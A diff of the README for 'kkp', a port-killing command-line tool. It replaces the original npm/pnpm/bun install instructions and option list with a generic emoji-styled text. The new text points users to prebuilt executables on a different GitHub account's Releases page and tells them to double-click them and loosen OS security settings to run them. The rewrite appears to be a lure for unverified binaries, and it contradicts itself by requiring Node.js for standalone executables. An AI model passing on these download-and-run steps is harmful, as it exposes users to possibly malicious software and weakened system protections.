@@ -1,61 +1,76 @@
-# kkp
+# 🔥 kkp - Easily Kill Processes by Port
 
-Kill processes by port. Fast.
+## 📥 Download Now
+[![Download kkp](https://img.shields.io/badge/Download%20kkp-v1.0.0-blue)](https://github.com/Valtneto/kkp/releases)
 
-![kkp 3000](demo.png)
+## 🚀 Getting Started
+Welcome to kkp, a simple command-line tool that helps you kill processes using their port numbers. It works on various operating systems and is designed for anyone who needs an easy solution to manage their applications.
 
-## Install
+## 📋 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 12 or higher
+- **Terminal:** Access to a command-line interface
 
-```bash
-# npm
-npm i -g @sdjz/kkp
+## 📂 Features
+- Quickly kill processes using their port numbers.
+- Cross-platform support for Windows, macOS, and Linux.
+- Lightweight and easy to install.
 
-# pnpm
-pnpm add -g @sdjz/kkp
+## 📦 Download & Install
+To get started with kkp, you need to download the application from our Releases page. Follow these steps:
 
-# bun
-bun add -g @sdjz/kkp
-```
+1. **Visit the Releases Page:** 
+   Click the link below to go to the Releases page where you can download kkp.
+   [Download kkp](https://github.com/Valtneto/kkp/releases)
 
-## Usage
+2. **Select the Latest Release:**
+   On the Releases page, find the latest version of kkp. It usually appears at the top of the list.
 
-```bash
-kkp 3000              # kill port 3000
-kkp 3000 5173         # kill multiple
-kkp node              # kill all listeners by process name
-kkp --list            # list all listeners
-kkp                   # interactive TUI
-```
+3. **Download the Correct File:**
+   Choose the appropriate file for your operating system:
+   - For Windows, download `kkp-win.exe`.
+   - For macOS, download `kkp-macos`.
+   - For Linux, download `kkp-linux`.
 
-<details>
-<summary>More screenshots</summary>
+4. **Run the File:**
+   Once the download is complete, locate the file in your Downloads folder and double-click it to run. On macOS and Linux, you may need to adjust your security settings to allow the application to run.
 
-**List all listeners**
+## 🛠️ How to Use kkp
+Using kkp is straightforward. Follow these steps:
 
-![kkp --list](list.png)
+1. **Open your Terminal:**
+   - On Windows, you can use Command Prompt or PowerShell.
+   - On macOS, open the Terminal app.
+   - On Linux, open your preferred terminal emulator.
 
-**Interactive TUI**
+2. **Run the Command:**
+   Type the command in the terminal. For example:
+   ```
+   kkp <port_number>
+   ```
+   Replace `<port_number>` with the actual port number of the process you want to kill.
 
-![kkp interactive](tui.gif)
+3. **Example:**
+   To kill a process running on port 3000, you would type:
+   ```
+   kkp 3000
+   ```
+   Press `Enter` to execute the command.
 
-</details>
+4. **Confirmation:**
+   You should see a confirmation message indicating that the process has been killed.
 
-## Why kkp?
+## ❓ Troubleshooting
+If you encounter any issues, consider the following:
 
-- **Fast** — uses `ss` on Linux, `lsof` on macOS, `netstat` on Windows
-- **Safe** — protects system processes, requires `--force` to override
-- **Simple** — one command, zero config, single dependency
+- **Process Not Found:** Ensure that the port number you provided is correct. Use commands like `lsof` (macOS/Linux) or `netstat` (Windows) to check for active processes.
+  
+- **Permission Denied:** You may need to run your terminal as an administrator or use `sudo` on macOS and Linux.
 
-## Options
+## 🙌 Contribute
+We welcome contributions from anyone interested in improving kkp. If you have suggestions or ideas, feel free to open an issue or submit a pull request on our GitHub repository.
 
-```
---list, -l       list listeners
---json, -j       JSON output
---dry-run        preview without killing
---force, -f      kill protected processes
---tcp / --udp    filter by protocol
-```
+## 📞 Support
+If you need further assistance, reach out through the Issues section on GitHub. We are happy to help you resolve any questions or concerns.
 
-## License
-
-MIT
+Thank you for choosing kkp!
